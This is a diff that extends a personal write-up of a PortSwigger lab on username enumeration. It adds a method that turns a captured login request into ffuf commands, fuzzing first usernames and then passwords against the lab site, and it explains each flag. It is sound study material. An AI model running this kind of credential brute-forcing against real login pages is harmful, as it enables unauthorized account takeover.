@@ -671,6 +671,8 @@ Username enumeration makes brute-force attacks easier because attackers no longe
 
 ## Lab 6 : Username enumeration via different responses
 
+## Method 1 Using Burp 
+
 ![](../../../assets/Pasted%20image%2020260529090147.png)
 
 This Challenge involves enumerating usernames and passwords.
@@ -702,3 +704,160 @@ For the Password we don't see the length of the pass rather we check unique stat
 ![](../../../assets/Pasted%20image%2020260529091246.png)
 
 Just like that we Solved the Lab.
+
+## Method 2 Using FFUF
+
+I gotta Admit i used burp to get the request and copy it as a curl command
+
+```
+curl --path-as-is -i -s -k -X $'POST' \
+    -H $'Host: 0a960010049904e4803fbc17002f00b1.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 35' -H $'Origin: https://0a960010049904e4803fbc17002f00b1.web-security-academy.net' -H $'Referer: https://0a960010049904e4803fbc17002f00b1.web-security-academy.net/login' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Priority: u=0, i' -H $'Te: trailers' \
+    -b $'session=onsmS5FfxmwuHqwPQzrlJVTXCnYJOgfF' \
+    --data-binary $'username=username&password=password' \
+    $'https://0a960010049904e4803fbc17002f00b1.web-security-academy.net/login'
+```
+
+I got this curl command but we need to transform it into FFUF Format and this where AI comes in. 
+
+# Understanding the ffuf Command
+
+```bash
+ffuf -w usernames.txt \
+-u https://target.com/login \
+-X POST \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-b "session=YOURSESSION" \
+-d "username=FUZZ&password=password" \
+-fs 2000
+```
+
+## `ffuf`
+
+Starts the ffuf fuzzing tool.
+
+## `-w usernames.txt`
+
+Uses `usernames.txt` as the wordlist.
+
+Each line replaces the `FUZZ` keyword.
+
+Example:
+
+```text
+admin
+carlos
+guest
+```
+
+
+## `-u`
+
+Specifies the target URL.
+
+```bash
+-u https://target.com/login
+```
+
+## `-X POST`
+
+Uses the `POST` request method.
+
+Login forms usually use POST instead of GET.
+
+## `-H`
+
+Adds HTTP headers.
+
+```bash
+-H "Content-Type: application/x-www-form-urlencoded"
+```
+
+Tells the server the request contains form data.
+
+## `-b`
+
+Sends cookies.
+
+```bash
+-b "session=YOURSESSION"
+```
+
+Useful when the application requires a valid session.
+
+## `-d`
+
+Sends POST data.
+
+```bash
+-d "username=FUZZ&password=password"
+```
+
+`FUZZ` gets replaced with usernames from the wordlist.
+
+Example generated request:
+
+```text
+username=carlos&password=password
+```
+
+
+## `-fs 2000`
+
+Filters responses by size.
+
+```bash
+-fs 2000
+```
+
+Hides responses that are exactly `2000` bytes.
+
+Useful because invalid usernames often return the same response size while valid usernames return a different one.
+
+# What This Command Does
+
+This command:
+
+- reads usernames from a wordlist
+    
+- sends POST login requests
+    
+- fuzzes the username field
+    
+- keeps the password fixed
+    
+- includes a session cookie
+    
+- filters normal responses
+    
+- shows only interesting results
+
+I copied the given username and saved it as username.txt
+
+![](../../../assets/Pasted%20image%2020260529095157.png)
+
+`NOTE` The reason i got new username is because i had to access the lab again and that changes the username and password every time. 
+
+To find the pass we run the same command except we fuzz for the pass.
+```
+ffuf -w passwords.txt \
+-u https://0afd00d504b876e981c225a500b600c4.web-security-academy.net/login \
+-X POST \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-b "session=9pkKc1wOoHc3nzEuvf5XnV1oZ2cUN3gB" \
+-d "username=albuquerque&password=FUZZ"
+```
+
+You might see different username here in the command and that is because the sessions are keep timing out so i had to do it agian but the commands and flow is similar.
+
+![](../../../assets/Pasted%20image%2020260529101130.png)
+
+Here we see 302 status code which means redirect and all the other status codes are also different so from that we understand that `mom` is the pass.
+
+![](../../../assets/Pasted%20image%2020260529101241.png)
+
+Just like that we solved the lab.
+
+
+## Final Thought
+
+While Community Version of Burp is really good for many things but it has some limitations especially when it comes to bruteforcing usernames and passwords and to go around that, we can user Burp Extensions or other tools like FFUF.
